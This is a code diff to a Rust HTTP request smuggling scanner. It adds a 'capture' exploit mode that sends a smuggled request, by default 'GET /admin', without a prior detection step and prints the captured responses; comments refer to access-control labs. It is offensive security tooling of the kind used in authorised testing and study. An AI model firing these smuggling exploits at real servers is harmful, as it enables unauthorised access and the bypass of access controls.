@@ -636,10 +636,13 @@ async fn scan_one_target(target: String, cli: Cli) -> ScanOutcome {
     // In machine/JSON mode we still allow payload export via the check phase, but skip exploit execution
     // to keep stdout clean and because exploit details are better consumed interactively.
     if let Some(ref exploit_str) = cli.exploit {
-        // The `smuggle` exploit fires its payload directly and does not depend on
-        // a prior detection, so allow it to run even when the scan was quiet.
-        let smuggle_requested = exploit_str.split(',').any(|x| x.trim() == "smuggle");
-        if (found_vulnerability || smuggle_requested) && !is_machine() {
+        // The `smuggle`/`capture` exploits fire their payload directly and do not
+        // depend on a prior detection, so allow them to run even when the scan
+        // was quiet.
+        let direct_exploit = exploit_str
+            .split(',')
+            .any(|x| matches!(x.trim(), "smuggle" | "capture"));
+        if (found_vulnerability || direct_exploit) && !is_machine() {
             let exploit_params = ExploitParams {
                 exploit_str,
                 results: &results,
@@ -896,6 +899,37 @@ async fn run_exploits(params: &ExploitParams<'_>) -> Result<()> {
                         &inner_request,
                     ),
                     Err(e) => log(LogLevel::Error, &format!("smuggle exploit failed: {}", e)),
+                }
+            }
+            "capture" => {
+                log(LogLevel::Info, "running capture exploit");
+
+                // The request to smuggle and capture. Defaults to GET /admin (the
+                // recon step the access-control labs need); must be complete.
+                let smuggled = params
+                    .smuggle_request
+                    .map(|s| s.replace("\\r\\n", "\r\n").replace("\\n", "\n"))
+                    .unwrap_or_else(|| {
+                        format!("GET /admin HTTP/1.1\r\nHost: {}\r\n\r\n", params.host)
+                    });
+
+                let capture_params = smugglex::exploit::CaptureParams {
+                    host: params.host,
+                    port: params.port,
+                    path: params.path,
+                    use_tls: params.use_tls,
+                    timeout: params.timeout,
+                    verbose: params.verbose,
+                    smuggled_request: smuggled.clone(),
+                    follow_ups: 3,
+                };
+                match smugglex::exploit::test_capture(&capture_params).await {
+                    Ok(result) => smugglex::exploit::print_capture_results(
+                        &result,
+                        params.target_url,
+                        &smuggled,
+                    ),
+                    Err(e) => log(LogLevel::Error, &format!("capture exploit failed: {}", e)),
                 }
             }
             _ => {
